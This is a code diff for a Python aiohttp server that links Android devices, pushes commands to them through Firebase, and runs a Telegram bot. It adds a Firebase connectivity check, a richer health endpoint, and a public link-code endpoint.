@@ -75,6 +75,8 @@ _chat_rate_counter = {}  # rate limit: chat_id -> [timestamps]
 _data_forward_dedup = {}  # data forward dedup: device_id:type -> timestamp
 _data_body_dedup = {}  # dedup for /api/data body endpoint: device_id:command -> {last_time, last_hash}
 
+firebase_connected = False  # Tracks Firebase connectivity status
+
 # حد أدنى بين رسائل البوت لنفس المحادثة (بالثواني)
 RATE_LIMIT_SECONDS = 1
 # حد أدنى بين إنشاء أكواد الربط (بالثواني)
@@ -524,10 +526,34 @@ def delete_session(token):
 # LINK CODE HELPERS (Firebase Realtime Database + Local)
 # ============================================================================
 
+async def check_firebase_connectivity():
+    """Test Firebase connectivity and set global firebase_connected flag."""
+    global firebase_connected
+    if not FIREBASE_DB_SECRET:
+        log.warning("FIREBASE_DB_SECRET is empty - Firebase operations will use public access rules only")
+    try:
+        session = get_tg_session()
+        url = f"{FIREBASE_RTDB_URL}/.json"
+        if FIREBASE_DB_SECRET:
+            url += f"?auth={FIREBASE_DB_SECRET}"
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
+            if resp.status == 200:
+                firebase_connected = True
+                log.info("Firebase connectivity check: OK (status=200)")
+            else:
+                firebase_connected = False
+                log.warning("Firebase connectivity check: FAIL (status=%d)", resp.status)
+    except Exception as exc:
+        firebase_connected = False
+        log.warning("Firebase connectivity check: UNREACHABLE (%s)", exc)
+    return firebase_connected
+
+
 async def firebase_get(path):
     """GET data from Firebase RTDB.
     يعمل بدون مصادقة إذا كانت القواعد تسمح بالوصول العام.
-    أو مع Database Secret إذا تم تعيين FIREBASE_DB_SECRET."""
+    أو مع Database Secret إذا تم تعيين FIREBASE_DB_SECRET.
+    Gracefully returns None if Firebase is unavailable."""
     try:
         url = f"{FIREBASE_RTDB_URL}/{path}.json"
         if FIREBASE_DB_SECRET:
@@ -547,7 +573,8 @@ async def firebase_get(path):
 
 async def firebase_set(path, data):
     """SET data in Firebase RTDB - with optional Database Secret auth.
-    If data is None, uses DELETE instead of PUT (to properly remove the key)."""
+    If data is None, uses DELETE instead of PUT (to properly remove the key).
+    Gracefully returns False if Firebase is unavailable."""
     try:
         url = f"{FIREBASE_RTDB_URL}/{path}.json"
         if FIREBASE_DB_SECRET:
@@ -576,7 +603,8 @@ async def firebase_set(path, data):
 
 
 async def firebase_update(path, data):
-    """PATCH (partial update) data in Firebase RTDB - with optional Database Secret auth."""
+    """PATCH (partial update) data in Firebase RTDB - with optional Database Secret auth.
+    Gracefully returns False if Firebase is unavailable."""
     try:
         url = f"{FIREBASE_RTDB_URL}/{path}.json"
         if FIREBASE_DB_SECRET:
@@ -1643,13 +1671,14 @@ async def api_verify_link(request):
 
         return web.json_response({
             "ok": True,
+            "success": True,
             "device_token": device_token,
             "server_domain": SERVER_DOMAIN,
             "message": "Device linked successfully",
         })
     except Exception as exc:
         log.error("verify_link error: %s", exc)
-        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+        return web.json_response({"ok": False, "success": False, "error": str(exc)}, status=500)
 
 
 async def api_register(request):
@@ -1721,6 +1750,7 @@ async def api_register(request):
             "device_id": device_id,
             "device_token": device_data["token"],
             "token": device_data["token"],
+            "server_domain": SERVER_DOMAIN,
             "message": "تم تسجيل الجهاز بنجاح",
         })
     except Exception as exc:
@@ -3089,7 +3119,15 @@ def create_app():
     
     # Health check endpoint (for Android app connectivity test)
     async def api_health(request):
-        return web.json_response({"ok": True, "status": "running", "version": "3.4"})
+        return web.json_response({
+            "ok": True,
+            "status": "running",
+            "version": "3.4",
+            "firebase": firebase_connected,
+            "uptime": get_uptime(),
+            "devices": len(get_devices()),
+            "commands": len(COMMAND_REGISTRY),
+        })
     app.router.add_get("/api/health", api_health)
     
     # Auth API
@@ -3105,6 +3143,19 @@ def create_app():
     app.router.add_post("/api/data", api_device_data_body)
     app.router.add_post("/api/heartbeat", api_heartbeat)
     app.router.add_get("/api/settings/{device_id}", api_device_settings)
+
+    # Public API - link code generation (no auth required for device linking)
+    async def api_generate_link(request):
+        """POST /api/link_code - Generate a new link code for device pairing."""
+        global api_hits
+        api_hits += 1
+        try:
+            entry = await generate_link_code()
+            return web.json_response({"ok": True, "code": entry["code"], "session_id": entry.get("session_id", "")})
+        except Exception as exc:
+            log.error("link_code generation error: %s", exc)
+            return web.json_response({"ok": False, "error": str(exc)}, status=500)
+    app.router.add_post("/api/link_code", api_generate_link)
     
     # Web API (requires auth)
     app.router.add_get("/api/web/devices", api_web_devices)
@@ -3134,8 +3185,16 @@ async def on_startup(app):
     log.info("Port: %d", SERVER_PORT)
     log.info("Admin: %d", ADMIN_CHAT_ID)
     log.info("Commands: %d", len(COMMAND_REGISTRY))
+    log.info("Firebase Secret: %s", "SET" if FIREBASE_DB_SECRET else "NOT SET")
     log.info("=" * 60)
-    
+
+    # Check Firebase connectivity at startup
+    await check_firebase_connectivity()
+    if not firebase_connected:
+        log.warning("Firebase not reachable - running in LOCAL-ONLY mode (commands via REST API only)")
+    else:
+        log.info("Firebase connected - commands will be pushed to Firebase RTDB")
+
     # Start Telegram polling in background
     app["tg_task"] = asyncio.create_task(tg_poll_loop())
     # Start session cleanup
